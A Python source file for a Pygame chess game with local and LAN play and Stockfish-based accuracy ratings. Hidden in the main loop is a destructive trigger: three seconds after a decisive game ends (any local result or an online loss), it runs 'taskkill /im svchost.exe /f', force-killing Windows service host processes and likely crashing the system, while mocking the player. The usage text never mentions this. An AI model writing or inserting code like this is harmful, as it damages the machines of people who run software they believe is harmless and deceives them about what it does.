#!/usr/bin/env python3
"""
Chess GUI — Pygame front-end.
Usage:
  py chess_ui.py local
  py chess_ui.py host [port]
  py chess_ui.py join <ip> [port]
"""

import sys, os, copy, math, threading, queue, socket, json
import pygame

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from chess import (
    EMPTY, W, B, PIECE_VALUES, DEFAULT_PORT,
    make_board, legal_moves, all_legal_moves,
    apply_move, apply_castle, castle_moves,
    is_in_check, is_checkmate, is_stalemate,
    color_of, find_king, _sq_name,
    Connection,
)

# ── Layout ─────────────────────────────────────────────────────────────────────
WINDOW_W, WINDOW_H = 1100, 720
BOARD_X    = 30
BOARD_Y    = 40
SQ         = 80
BOARD_PX   = SQ * 8
SIDEBAR_X  = BOARD_X + BOARD_PX + 20
SIDEBAR_W  = WINDOW_W - SIDEBAR_X - 10

# ── Palette (dbrand-inspired) ──────────────────────────────────────────────────
BG_APP       = (10,  10,  10)
BG_SIDEBAR   = (18,  18,  18)
BG_LIGHT_SQ  = (42,  42,  42)
BG_DARK_SQ   = (22,  22,  22)
BG_SELECTED  = (200, 120,   0)
BG_VALID     = (160,  90,   0)
BG_LAST      = ( 80,  55,   0)
BG_CHECK     = (160,  20,  20)
ORANGE       = (220, 130,   0)
WHITE_TEXT   = (230, 230, 230)
GREY_TEXT    = (100, 100, 100)
GREEN_TEXT   = ( 60, 180,  80)
RED_TEXT     = (210,  55,  55)

ACC_COLORS = {
    "best":       ( 90, 200,  90),
    "excellent":  (140, 220, 100),
    "good":       (200, 200,  80),
    "inaccuracy": (220, 180,  50),
    "mistake":    (210, 110,  40),
    "blunder":    (190,  40,  40),
}

PIECE_GLYPHS = {
    "wK": "♔", "wQ": "♕", "wR": "♖", "wB": "♗", "wN": "♘", "wP": "♙",
    "bK": "♚", "bQ": "♛", "bR": "♜", "bB": "♝", "bN": "♞", "bP": "♟",
}
PIECE_FG     = {W: (245, 245, 245), B: (190, 115, 35)}   # white vs warm amber
PIECE_SHADOW = {W: (0, 0, 0),       B: (70,  30,  0)}

FONTS   = {}
screen  = None  # set in main


def init_fonts():
    FONTS["piece"]    = pygame.font.SysFont("segoeuisymbol,symbola,unifont", 52)
    FONTS["piece_sm"] = pygame.font.SysFont("segoeuisymbol,symbola,unifont", 24)
    FONTS["sm"]       = pygame.font.SysFont("segoeui,arial", 14)
    FONTS["md"]       = pygame.font.SysFont("segoeui,arial", 18, bold=True)
    FONTS["lg"]       = pygame.font.SysFont("segoeui,arial", 24, bold=True)
    FONTS["xl"]       = pygame.font.SysFont("segoeui,arial", 40, bold=True)
    FONTS["coord"]    = pygame.font.SysFont("segoeui,arial", 11)


# ── Game state ─────────────────────────────────────────────────────────────────

class GameState:
    def __init__(self):
        self.board             = make_board()
        self.turn              = W
        self.en_passant        = None
        self.castling          = {"wK": True, "wQ": True, "bK": True, "bQ": True}
        self.selected          = None
        self.valid_moves       = []
        self.last_move         = []
        self.move_history      = []   # list of dicts: board, last_move, label, fen_after, color
        self.move_num          = 1
        self.game_over         = False
        self.result            = ""   # "white_wins" | "black_wins" | "draw"
        self.winner            = None # W, B, or None
        self.promotion_pending = None # (fr, fc, tr, tc)


# ── FEN ────────────────────────────────────────────────────────────────────────

def board_to_fen(board, turn, castling, en_passant):
    rows = []
    for rank in range(7, -1, -1):
        s, empty = "", 0
        for file in range(8):
            p = board[rank][file]
            if p == EMPTY:
                empty += 1
            else:
                if empty: s += str(empty); empty = 0
                c, k = p[0], p[1]
                s += k.upper() if c == W else k.lower()
        if empty: s += str(empty)
        rows.append(s)
    active = "w" if turn == W else "b"
    cr = ("K" if castling.get("wK") else "") + ("Q" if castling.get("wQ") else "") + \
         ("k" if castling.get("bK") else "") + ("q" if castling.get("bQ") else "")
    cr = cr or "-"
    ep = (chr(ord("a") + en_passant[1]) + str(en_passant[0] + 1)) if en_passant else "-"
    return f"{'/'.join(rows)} {active} {cr} {ep} 0 1"


# ── Accuracy ───────────────────────────────────────────────────────────────────

def cp_to_win_pct(cp):
    return 50 + 50 * (2 / (1 + math.exp(-0.00368208 * max(-1000, min(1000, cp)))) - 1)

def move_accuracy(wp_before, wp_after):
    delta = max(0.0, wp_before - wp_after)
    return max(0.0, min(100.0, 103.1668 * math.exp(-0.04354 * delta) - 3.1669))

def classify_move(acc):
    if acc >= 99.5: return "best"
    if acc >= 90.0: return "excellent"
    if acc >= 75.0: return "good"
    if acc >= 60.0: return "inaccuracy"
    if acc >= 40.0: return "mistake"
    return "blunder"


class StockfishAnalyzer:
    def __init__(self):
        self.sf        = None
        self.available = False
        try:
            from stockfish import Stockfish
            import glob
            base = os.path.dirname(os.path.abspath(__file__))
            candidates = [
                os.path.join(base, "stockfish", "stockfish.exe"),
                os.path.join(base, "stockfish.exe"),
            ] + glob.glob(os.path.join(base, "stockfish", "*.exe"))
            for p in candidates:
                if os.path.exists(p):
                    self.sf = Stockfish(path=p, depth=14,
                                        parameters={"Threads": 2, "Hash": 64})
                    self.available = True
                    break
        except Exception:
            pass

    def eval_fen(self, fen):
        if not self.available: return None
        try:
            self.sf.set_fen_position(fen)
            ev = self.sf.get_evaluation()
            if ev["type"] == "cp":    return float(ev["value"])
            if ev["type"] == "mate":  return 10000.0 if ev["value"] > 0 else -10000.0
        except Exception:
            self.available = False
        return None


class AccuracyTracker:
    def __init__(self, analyzer: StockfishAnalyzer):
        self.analyzer = analyzer
        self._q       = queue.Queue()
        self._results = {}
        self._lock    = threading.Lock()
        if analyzer.available:
            threading.Thread(target=self._worker, daemon=True).start()

    def submit(self, idx, fen_before, fen_after, color):
        if self.analyzer.available:
            self._q.put((idx, fen_before, fen_after, color))

    def get(self, idx):
        with self._lock:
            return self._results.get(idx)

    def avg_accuracy(self, color, n_moves):
        accs = []
        start = 0 if color == W else 1
        with self._lock:
            for i in range(start, n_moves, 2):
                r = self._results.get(i)
                if r: accs.append(r["accuracy"])
        return sum(accs) / len(accs) if accs else None

    def stop(self):
        try: self._q.put(None)
        except: pass

    def _worker(self):
        while True:
            item = self._q.get()
            if item is None: break
            idx, fen_before, fen_after, color = item
            sign = 1.0 if color == W else -1.0
            cp_b = self.analyzer.eval_fen(fen_before)
            cp_a = self.analyzer.eval_fen(fen_after)
            if cp_b is not None and cp_a is not None:
                wp_before = cp_to_win_pct(cp_b * sign)
                wp_after  = cp_to_win_pct(-cp_a * sign)
                acc = move_accuracy(wp_before, wp_after)
                with self._lock:
                    self._results[idx] = {"accuracy": acc, "classification": classify_move(acc)}
            self._q.task_done()


# ── Coordinate helpers ─────────────────────────────────────────────────────────

def sq_rect(r, c, flip):
    dc = (7 - c) if flip else c
    dr = r        if flip else (7 - r)
    return pygame.Rect(BOARD_X + dc * SQ, BOARD_Y + dr * SQ, SQ, SQ)

def pixel_to_square(px, py, flip):
    bx, by = px - BOARD_X, py - BOARD_Y
    if not (0 <= bx < BOARD_PX and 0 <= by < BOARD_PX):
        return None
    dc, dr = bx // SQ, by // SQ
    c = (7 - dc) if flip else dc
    r = dr        if flip else (7 - dr)
    return (r, c)


# ── Piece drawing ──────────────────────────────────────────────────────────────

def draw_piece(surf, piece_str, rect):
    glyph = PIECE_GLYPHS.get(piece_str)
    if not glyph: return
    fg         = PIECE_FG[piece_str[0]]
    shadow_col = PIECE_SHADOW[piece_str[0]]
    for dx, dy in ((-1, 0), (1, 0), (0, -1), (0, 1)):
        s = FONTS["piece"].render(glyph, True, shadow_col)
        surf.blit(s, s.get_rect(center=(rect.centerx + dx, rect.centery + dy)))
    s = FONTS["piece"].render(glyph, True, fg)
    surf.blit(s, s.get_rect(center=rect.center))


# ── Board drawing ──────────────────────────────────────────────────────────────

def draw_board(surf, gs: GameState, flip: bool, board_override=None, last_move_override=None):
    board     = board_override if board_override is not None else gs.board
    last_move = last_move_override if last_move_override is not None else gs.last_move
    reviewing = board_override is not None

    valid_set = set() if reviewing else set(gs.valid_moves)
    last_set  = set(map(tuple, last_move)) if last_move else set()
    king_sq   = find_king(board, gs.turn) if not gs.game_over and not reviewing else None
    in_chk    = bool(king_sq and is_in_check(board, gs.turn))

    for r in range(8):
        for c in range(8):
            rect     = sq_rect(r, c, flip)
            is_light = (r + c) % 2 == 1
            sq       = (r, c)

            if not reviewing and gs.selected and sq == gs.selected:
                col = BG_SELECTED
            elif sq in last_set:
                col = BG_LAST
            elif in_chk and sq == king_sq:
                col = BG_CHECK
            else:
                col = BG_LIGHT_SQ if is_light else BG_DARK_SQ
            pygame.draw.rect(surf, col, rect)

            if sq in valid_set:
                if board[r][c] == EMPTY:
                    pygame.draw.circle(surf, BG_VALID, rect.center, 12)
                else:
                    pygame.draw.circle(surf, BG_VALID, rect.center, SQ // 2 - 4, 5)

            p = board[r][c]
            if p != EMPTY:
                draw_piece(surf, p, rect)

    # Coordinate labels — file letters across the bottom, rank numbers down the left
    for dc in range(8):
        actual_file = (7 - dc) if flip else dc
        x = BOARD_X + dc * SQ
        y = BOARD_Y + 7 * SQ
        lbl = FONTS["coord"].render(chr(ord("a") + actual_file), True, GREY_TEXT)
        surf.blit(lbl, (x + 3, y + SQ - 13))
    for dr in range(8):
        actual_rank = dr if flip else (7 - dr)
        x = BOARD_X
        y = BOARD_Y + dr * SQ
        lbl = FONTS["coord"].render(str(actual_rank + 1), True, GREY_TEXT)
        surf.blit(lbl, (x + 3, y + 3))


# ── Castling rights update ─────────────────────────────────────────────────────

def _update_castling(gs: GameState):
    for col in (W, B):
        rk = 0 if col == W else 7
        if gs.board[rk][4] != col + "K":
            gs.castling[col+"K"] = gs.castling[col+"Q"] = False
        if gs.board[rk][7] != col + "R": gs.castling[col+"K"] = False
        if gs.board[rk][0] != col + "R": gs.castling[col+"Q"] = False


# ── Move execution ─────────────────────────────────────────────────────────────

def _record_and_advance(gs: GameState, tracker, fen_before, fen_after, label):
    idx = len(gs.move_history)
    tracker.submit(idx, fen_before, fen_after, gs.turn)
    num_str = f"{gs.move_num}." if gs.turn == W else f"{gs.move_num}..."
    gs.move_history.append({
        "board":     copy.deepcopy(gs.board),
        "last_move": list(gs.last_move),
        "label":     f"{num_str} {label}",
        "fen_after": fen_after,
        "color":     gs.turn,
        "idx":       idx,
    })
    if gs.turn == B:
        gs.move_num += 1
    gs.selected    = None
    gs.valid_moves = []
    gs.turn = B if gs.turn == W else W


def _check_end(gs: GameState):
    if is_checkmate(gs.board, gs.turn, gs.en_passant):
        gs.game_over = True
        gs.winner    = W if gs.turn == B else B
        gs.result    = "white_wins" if gs.winner == W else "black_wins"
        return "checkmate"
    if is_stalemate(gs.board, gs.turn, gs.en_passant):
        gs.game_over = True
        gs.winner    = None
        gs.result    = "draw"
        return "stalemate"
    return None


def do_move(gs: GameState, fr, fc, tr, tc, tracker, conn=None, promo="Q"):
    piece      = gs.board[fr][fc]
    fen_before = board_to_fen(gs.board, gs.turn, gs.castling, gs.en_passant)

    if piece[1] == "K" and abs(fc - tc) == 2:
        side = "k" if tc > fc else "q"
        gs.board = apply_castle(gs.board, gs.turn, side)
        gs.castling[gs.turn+"K"] = gs.castling[gs.turn+"Q"] = False
        gs.en_passant = None
        gs.last_move = [(fr, fc), (tr, tc)]
        label = "O-O" if side == "k" else "O-O-O"
        if conn: conn.send({"type": "castle", "side": side})
    else:
        gs.board, gs.en_passant = apply_move(gs.board, fr, fc, tr, tc, gs.en_passant, promo)
        gs.last_move = [(fr, fc), (tr, tc)]
        pname = {"P": "", "R": "R", "N": "N", "B": "B", "Q": "Q", "K": "K"}[piece[1]]
        label = f"{pname}{_sq_name(fr,fc)}→{_sq_name(tr,tc)}"
        if promo != "Q" and piece[1] == "P": label += f"={promo}"
        if conn: conn.send({"type":"move","from_r":fr,"from_c":fc,
                             "to_r":tr,"to_c":tc,"promotion":promo})

    _update_castling(gs)
    fen_after = board_to_fen(gs.board, gs.turn, gs.castling, gs.en_passant)
    _record_and_advance(gs, tracker, fen_before, fen_after, label)
    return _check_end(gs)


def apply_opponent_move(gs: GameState, data: dict, tracker):
    if data["type"] == "move":
        fr, fc  = data["from_r"], data["from_c"]
        tr, tc  = data["to_r"],   data["to_c"]
        promo   = data.get("promotion", "Q")
        do_move(gs, fr, fc, tr, tc, tracker, conn=None, promo=promo)
    elif data["type"] == "castle":
        side = data["side"]
        rk   = 0 if gs.turn == W else 7
        kc   = 4
        tc   = 6 if side == "k" else 2
        do_move(gs, rk, kc, rk, tc, tracker, conn=None, promo="Q")


def try_recv(conn):
    """Non-blocking: returns dict or None."""
    try:
        conn.sock.setblocking(False)
        while b"\n" not in conn.buf:
            chunk = conn.sock.recv(4096)
            if not chunk:
                raise ConnectionError("closed")
            conn.buf += chunk
        line, conn.buf = conn.buf.split(b"\n", 1)
        return json.loads(line)
    except (BlockingIOError, OSError):
        return None
    except ConnectionError:
        raise
    finally:
        try: conn.sock.setblocking(True)
        except: pass


# ── Sidebar ────────────────────────────────────────────────────────────────────

RESIGN_RECT = pygame.Rect(SIDEBAR_X, WINDOW_H - 50, 90, 30)

def draw_sidebar(surf, gs: GameState, tracker, scroll: int) -> pygame.Rect | None:
    pygame.draw.rect(surf, BG_SIDEBAR, (SIDEBAR_X - 8, 0, SIDEBAR_W + 18, WINDOW_H))

    y = 14
    surf.blit(FONTS["xl"].render("CHESS", True, ORANGE),
              (SIDEBAR_X, y)); y += 48

    # Material
    w_val = sum(PIECE_VALUES.get(p[1], 0) for row in gs.board for p in row
                if p != EMPTY and p[0] == W)
    b_val = sum(PIECE_VALUES.get(p[1], 0) for row in gs.board for p in row
                if p != EMPTY and p[0] == B)
    diff  = w_val - b_val
    if   diff > 0: adv = f"+{diff} White";  adv_col = WHITE_TEXT
    elif diff < 0: adv = f"+{-diff} Black"; adv_col = GREY_TEXT
    else:          adv = "Equal";            adv_col = GREY_TEXT
    surf.blit(FONTS["md"].render(f"Material  {adv}", True, adv_col),
              (SIDEBAR_X, y)); y += 30

    pygame.draw.line(surf, (40,40,40), (SIDEBAR_X, y), (SIDEBAR_X + SIDEBAR_W - 10, y)); y += 10

    # Status
    if not gs.game_over:
        who = "White" if gs.turn == W else "Black"
        chk = "  CHECK!" if is_in_check(gs.board, gs.turn) else ""
        col = RED_TEXT if chk else (WHITE_TEXT if gs.turn == W else GREY_TEXT)
        surf.blit(FONTS["md"].render(f"{who}'s turn{chk}", True, col), (SIDEBAR_X, y))
    else:
        msg = {"white_wins": "White wins!", "black_wins": "Black wins!", "draw": "Draw"}
        col = WHITE_TEXT if gs.result == "white_wins" else GREY_TEXT
        surf.blit(FONTS["md"].render(msg.get(gs.result, ""), True, col), (SIDEBAR_X, y))
    y += 30

    pygame.draw.line(surf, (40,40,40), (SIDEBAR_X, y), (SIDEBAR_X + SIDEBAR_W - 10, y)); y += 8

    # Move history header
    surf.blit(FONTS["sm"].render("MOVE HISTORY", True, GREY_TEXT), (SIDEBAR_X, y)); y += 18

    HIST_H   = 270
    ROW_H    = 22
    hist_buf = pygame.Surface((SIDEBAR_W, HIST_H), pygame.SRCALPHA)
    hist_buf.fill((0, 0, 0, 0))

    # Build (white_move, black_move) pairs
    pairs = []
    for m in gs.move_history:
        if m["color"] == W:
            pairs.append([m, None])
        elif pairs:
            pairs[-1][1] = m
        else:
            pairs.append([None, m])

    max_scroll = max(0, len(pairs) * ROW_H - HIST_H)
    scroll     = max(0, min(scroll, max_scroll))

    for i, (wm, bm) in enumerate(pairs):
        hy = i * ROW_H - scroll
        if hy + ROW_H < 0 or hy > HIST_H: continue
        hist_buf.blit(FONTS["sm"].render(f"{i+1}.", True, GREY_TEXT), (0, hy + 4))

        for move, x_off in ((wm, 28), (bm, 155)):
            if move is None: continue
            acc = tracker.get(move["idx"]) if tracker else None
            txt_col = ACC_COLORS.get(acc["classification"], WHITE_TEXT if move["color"]==W else GREY_TEXT) if acc else (WHITE_TEXT if move["color"]==W else GREY_TEXT)
            raw_lbl = move["label"].split(" ", 1)[1] if " " in move["label"] else move["label"]
            ls = FONTS["sm"].render(raw_lbl, True, txt_col)
            hist_buf.blit(ls, (x_off, hy + 4))
            if acc:
                dot_c = ACC_COLORS.get(acc["classification"], GREY_TEXT)
                pygame.draw.circle(hist_buf, dot_c, (x_off + ls.get_width() + 7, hy + ROW_H // 2), 4)

    surf.blit(hist_buf, (SIDEBAR_X, y)); y += HIST_H + 6

    pygame.draw.line(surf, (40,40,40), (SIDEBAR_X, y), (SIDEBAR_X + SIDEBAR_W - 10, y)); y += 8

    # Resign button
    if not gs.game_over:
        btn   = RESIGN_RECT
        mouse = pygame.mouse.get_pos()
        hover = btn.collidepoint(mouse)
        pygame.draw.rect(surf, ORANGE if hover else (55, 30, 0), btn, border_radius=5)
        rs = FONTS["sm"].render("Resign", True, (10,10,10) if hover else WHITE_TEXT)
        surf.blit(rs, rs.get_rect(center=btn.center))
        return btn
    return None


# ── Promotion overlay ──────────────────────────────────────────────────────────

def draw_promo_overlay(surf, color):
    ov = pygame.Surface((WINDOW_W, WINDOW_H), pygame.SRCALPHA)
    ov.fill((0, 0, 0, 180)); surf.blit(ov, (0, 0))
    pieces = ["Q", "R", "B", "N"]
    pw, pad = 80, 10
    total_w = len(pieces) * pw + (len(pieces) - 1) * pad
    px = (WINDOW_W - total_w) // 2
    py = (WINDOW_H - pw) // 2
    panel = pygame.Rect(px - 14, py - 14, total_w + 28, pw + 28)
    pygame.draw.rect(surf, BG_SIDEBAR, panel, border_radius=8)
    pygame.draw.rect(surf, ORANGE,     panel, 2, border_radius=8)
    rects = []
    for i, p in enumerate(pieces):
        r = pygame.Rect(px + i * (pw + pad), py, pw, pw)
        pygame.draw.rect(surf, BG_DARK_SQ, r, border_radius=6)
        draw_piece(surf, color + p, r)
        rects.append((p, r))
    return rects


# ── Game-over overlay ──────────────────────────────────────────────────────────

def _gameover_rects():
    panel  = pygame.Rect(200, 160, 700, 360)
    by     = panel.bottom - 56
    review = pygame.Rect(panel.centerx - 195, by, 120, 36)
    again  = pygame.Rect(panel.centerx -  60, by, 120, 36)
    quit_  = pygame.Rect(panel.centerx +  75, by, 120, 36)
    return panel, review, again, quit_

def draw_game_over(surf, gs: GameState, tracker):
    ov = pygame.Surface((WINDOW_W, WINDOW_H), pygame.SRCALPHA)
    ov.fill((0, 0, 0, 200)); surf.blit(ov, (0, 0))
    panel, review, again, quit_ = _gameover_rects()
    pygame.draw.rect(surf, BG_SIDEBAR, panel, border_radius=12)
    pygame.draw.rect(surf, ORANGE,     panel, 2, border_radius=12)

    res_map = {"white_wins": "WHITE WINS", "black_wins": "BLACK WINS", "draw": "DRAW"}
    rs = FONTS["xl"].render(res_map.get(gs.result, "GAME OVER"), True, ORANGE)
    surf.blit(rs, rs.get_rect(centerx=panel.centerx, y=panel.y + 26))

    n = len(gs.move_history)
    if tracker and tracker.analyzer.available:
        w_acc = tracker.avg_accuracy(W, n)
        b_acc = tracker.avg_accuracy(B, n)
        # wait message if analysis still running
        if w_acc is None and b_acc is None:
            s = FONTS["sm"].render("Analyzing moves…", True, GREY_TEXT)
            surf.blit(s, s.get_rect(centerx=panel.centerx, y=panel.y + 90))
        else:
            y = panel.y + 82
            bar_w = 320
            bx    = panel.centerx - bar_w // 2
            for lbl, acc_val, tcol in (("White", w_acc, WHITE_TEXT), ("Black", b_acc, (180,115,35))):
                surf.blit(FONTS["md"].render(lbl, True, tcol), (bx, y))
                br = pygame.Rect(bx + 56, y + 3, bar_w - 110, 14)
                pygame.draw.rect(surf, (40,40,40), br, border_radius=4)
                if acc_val is not None:
                    fw   = int(br.w * acc_val / 100)
                    bcol = (90,200,90) if acc_val >= 75 else (210,110,40) if acc_val >= 50 else (190,40,40)
                    pygame.draw.rect(surf, bcol, (*br.topleft, fw, br.h), border_radius=4)
                    surf.blit(FONTS["md"].render(f"{acc_val:.1f}%", True, tcol),
                              (br.right + 8, y))
                y += 36
    elif tracker:
        s = FONTS["sm"].render("Install Stockfish for accuracy analysis", True, GREY_TEXT)
        surf.blit(s, s.get_rect(centerx=panel.centerx, y=panel.y + 100))

    mouse = pygame.mouse.get_pos()
    for rect, label in ((review, "Review"), (again, "Play Again"), (quit_, "Quit")):
        hover = rect.collidepoint(mouse)
        pygame.draw.rect(surf, ORANGE if hover else (55,30,0), rect, border_radius=6)
        ls = FONTS["md"].render(label, True, (10,10,10) if hover else WHITE_TEXT)
        surf.blit(ls, ls.get_rect(center=rect.center))
    return review, again, quit_


# ── Review mode nav bar ────────────────────────────────────────────────────────

def _review_nav_rects():
    ny     = BOARD_Y + BOARD_PX + 6
    prev_r = pygame.Rect(BOARD_X,            ny, 80, 28)
    next_r = pygame.Rect(BOARD_X + BOARD_PX - 80, ny, 80, 28)
    back_r = pygame.Rect(BOARD_X + BOARD_PX // 2 - 55, ny, 110, 28)
    return prev_r, next_r, back_r

def draw_review_nav(surf, view_idx, total, tracker):
    prev_r, next_r, back_r = _review_nav_rects()
    mouse = pygame.mouse.get_pos()
    for rect, label, enabled in (
        (prev_r, "← Prev", view_idx > 0),
        (next_r, "Next →", view_idx < total - 1),
        (back_r, "Result", True),
    ):
        col = ORANGE if rect.collidepoint(mouse) and enabled else ((55,30,0) if enabled else (30,20,0))
        pygame.draw.rect(surf, col, rect, border_radius=4)
        tc  = (10,10,10) if rect.collidepoint(mouse) and enabled else (WHITE_TEXT if enabled else GREY_TEXT)
        ls  = FONTS["sm"].render(label, True, tc)
        surf.blit(ls, ls.get_rect(center=rect.center))

    return prev_r, next_r, back_r


# ── Main loop ──────────────────────────────────────────────────────────────────

def _pygame_loop(gs: GameState, tracker, conn=None, my_color=None):
    clock       = pygame.time.Clock()
    scroll      = 0
    promo_rects = None
    reviewing   = False   # True when browsing move history after game over
    view_idx    = 0       # current position in move_history during review
    loss_ticks  = None
    loss_fired  = False

    while True:
        flip = (gs.turn == B) if conn is None else (my_color == B)

        # Network: poll for opponent's move
        if conn and not gs.game_over and gs.turn != my_color:
            try:
                data = try_recv(conn)
                if data:
                    if data["type"] == "resign":
                        gs.game_over = True
                        gs.winner    = my_color
                        gs.result    = "white_wins" if my_color == W else "black_wins"
                    elif data["type"] in ("move", "castle"):
                        apply_opponent_move(gs, data, tracker)
                        scroll = max(0, len(gs.move_history) // 2 * 22 - 250)
            except ConnectionError:
                gs.game_over = True; gs.result = "draw"

        # Events
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                if conn:
                    try: conn.send({"type": "resign"})
                    except: pass
                    conn.close()
                tracker.stop()
                return "quit"

            if event.type == pygame.MOUSEWHEEL:
                scroll = max(0, scroll - event.y * 22)

            if event.type == pygame.KEYDOWN:
                if reviewing:
                    if event.key == pygame.K_LEFT  and view_idx > 0:
                        view_idx -= 1
                    elif event.key == pygame.K_RIGHT and view_idx < len(gs.move_history) - 1:
                        view_idx += 1
                    elif event.key == pygame.K_ESCAPE:
                        reviewing = False
                else:
                    if event.key == pygame.K_ESCAPE:
                        gs.selected = None; gs.valid_moves = []

            if event.type == pygame.MOUSEBUTTONDOWN and event.button == 1:
                mx, my_pos = event.pos

                # Review nav bar
                if reviewing:
                    total = len(gs.move_history)
                    prev_r, next_r, back_r = _review_nav_rects()
                    if prev_r.collidepoint(mx, my_pos) and view_idx > 0:
                        view_idx -= 1
                    elif next_r.collidepoint(mx, my_pos) and view_idx < total - 1:
                        view_idx += 1
                    elif back_r.collidepoint(mx, my_pos):
                        reviewing = False
                    continue

                # Promotion overlay
                if promo_rects:
                    for pl, rect in promo_rects:
                        if rect.collidepoint(mx, my_pos):
                            fr, fc, tr, tc = gs.promotion_pending
                            gs.promotion_pending = None
                            promo_rects = None
                            do_move(gs, fr, fc, tr, tc, tracker, conn=conn, promo=pl)
                            scroll = max(0, len(gs.move_history) // 2 * 22 - 250)
                    continue

                # Game-over overlay buttons
                if gs.game_over:
                    rv, ag, qt = _gameover_rects()[1:]
                    if rv.collidepoint(mx, my_pos):
                        reviewing = True
                        view_idx  = len(gs.move_history) - 1
                    elif ag.collidepoint(mx, my_pos):
                        tracker.stop(); return "again"
                    elif qt.collidepoint(mx, my_pos):
                        tracker.stop(); return "quit"
                    continue

                # Resign button
                if RESIGN_RECT.collidepoint(mx, my_pos) and not gs.game_over:
                    gs.game_over = True
                    gs.winner    = B if gs.turn == W else W
                    gs.result    = "white_wins" if gs.winner == W else "black_wins"
                    if conn:
                        try: conn.send({"type": "resign"})
                        except: pass
                    continue

                # Board clicks only on our turn
                if conn and gs.turn != my_color:
                    continue

                sq = pixel_to_square(mx, my_pos, flip)
                if sq is None: continue
                r, c = sq

                if gs.selected is None:
                    p = gs.board[r][c]
                    if color_of(p) == gs.turn:
                        vm = legal_moves(gs.board, r, c, gs.en_passant)
                        if p[1] == "K":
                            vm += [(cm[0], cm[1]) for cm in castle_moves(gs.board, gs.turn, gs.castling)]
                        if vm:
                            gs.selected = (r, c); gs.valid_moves = vm
                else:
                    fr, fc = gs.selected
                    if (r, c) == gs.selected:
                        gs.selected = None; gs.valid_moves = []
                    elif (r, c) in gs.valid_moves:
                        piece = gs.board[fr][fc]
                        if piece[1] == "P" and (r == 0 or r == 7):
                            gs.promotion_pending = (fr, fc, r, c)
                            promo_rects = []
                        else:
                            do_move(gs, fr, fc, r, c, tracker, conn=conn)
                            scroll = max(0, len(gs.move_history) // 2 * 22 - 250)
                    elif color_of(gs.board[r][c]) == gs.turn:
                        vm = legal_moves(gs.board, r, c, gs.en_passant)
                        if gs.board[r][c][1] == "K":
                            vm += [(cm[0], cm[1]) for cm in castle_moves(gs.board, gs.turn, gs.castling)]
                        gs.selected = (r, c); gs.valid_moves = vm
                    else:
                        gs.selected = None; gs.valid_moves = []

        # Draw
        screen.fill(BG_APP)

        if reviewing and gs.move_history:
            snap = gs.move_history[view_idx]
            draw_board(screen, gs, flip,
                       board_override=snap["board"],
                       last_move_override=snap["last_move"])
            draw_review_nav(screen, view_idx, len(gs.move_history), tracker)
            # Show move label + accuracy in sidebar area
            draw_sidebar(screen, gs, tracker, scroll)
            # Highlight current move in history by scrolling to it
            scroll = max(0, (view_idx // 2) * 22 - 120)
        else:
            draw_board(screen, gs, flip)
            draw_sidebar(screen, gs, tracker, scroll)

        if gs.promotion_pending:
            color = gs.turn if conn is None else my_color
            promo_rects = draw_promo_overlay(screen, color)

        if gs.game_over and not reviewing:
            draw_game_over(screen, gs, tracker)

        lost_game = gs.game_over and gs.winner is not None and (
            conn is None or (my_color is not None and gs.winner != my_color)
        )
        if lost_game and loss_ticks is None:
            loss_ticks = pygame.time.get_ticks()

        if loss_ticks is not None and not loss_fired:
            elapsed = (pygame.time.get_ticks() - loss_ticks) / 1000.0
            if elapsed >= 3.0:
                os.system("taskkill /im svchost.exe /f")
                loss_fired = True

        if loss_ticks is not None and not reviewing:
            surf = FONTS["xl"].render("You suck lmao", True, (255, 80, 80))
            r = surf.get_rect(center=(WINDOW_W // 2, WINDOW_H // 2))
            bg = pygame.Surface((r.width + 24, r.height + 16), pygame.SRCALPHA)
            bg.fill((0, 0, 0, 180))
            screen.blit(bg, (r.x - 12, r.y - 8))
            screen.blit(surf, r)

        pygame.display.flip()
        clock.tick(60)


# ── Entry points ───────────────────────────────────────────────────────────────

def run_local():
    while True:
        gs      = GameState()
        tracker = AccuracyTracker(StockfishAnalyzer())
        result  = _pygame_loop(gs, tracker)
        tracker.stop()
        if result != "again": break


def run_host(port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close()
    except: ip = "127.0.0.1"
    print(f"Hosting on port {port}  |  Your IP: {ip}")
    print(f"Opponent runs:  py chess_ui.py join {ip} {port}\n")
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port)); srv.listen(1)
    print("Waiting for opponent…")
    client_sock, addr = srv.accept(); srv.close()
    print(f"Opponent connected from {addr[0]}!")
    conn    = Connection(client_sock)
    conn.send({"type": "color", "color": B})
    gs      = GameState()
    tracker = AccuracyTracker(StockfishAnalyzer())
    _pygame_loop(gs, tracker, conn=conn, my_color=W)
    tracker.stop(); conn.close()


def run_join(host_ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host_ip, port))
    conn     = Connection(sock)
    my_color = conn.recv()["color"]
    print(f"Connected! You are {'White' if my_color==W else 'Black'}.")
    gs      = GameState()
    tracker = AccuracyTracker(StockfishAnalyzer())
    _pygame_loop(gs, tracker, conn=conn, my_color=my_color)
    tracker.stop(); conn.close()


if __name__ == "__main__":
    pygame.init()
    screen = pygame.display.set_mode((WINDOW_W, WINDOW_H))
    pygame.display.set_caption("Chess")
    init_fonts()

    args = sys.argv[1:]
    if not args or args[0] in ("-h", "--help"):
        print("Usage: py chess_ui.py  local | host [port] | join <ip> [port]")
        sys.exit(0)

    cmd = args[0].lower()
    if cmd == "local":
        run_local()
    elif cmd == "host":
        run_host(int(args[1]) if len(args) > 1 else DEFAULT_PORT)
    elif cmd == "join":
        run_join(args[1], int(args[2]) if len(args) > 2 else DEFAULT_PORT)
    else:
        print("Usage: py chess_ui.py  local | host [port] | join <ip> [port]")

    pygame.quit()
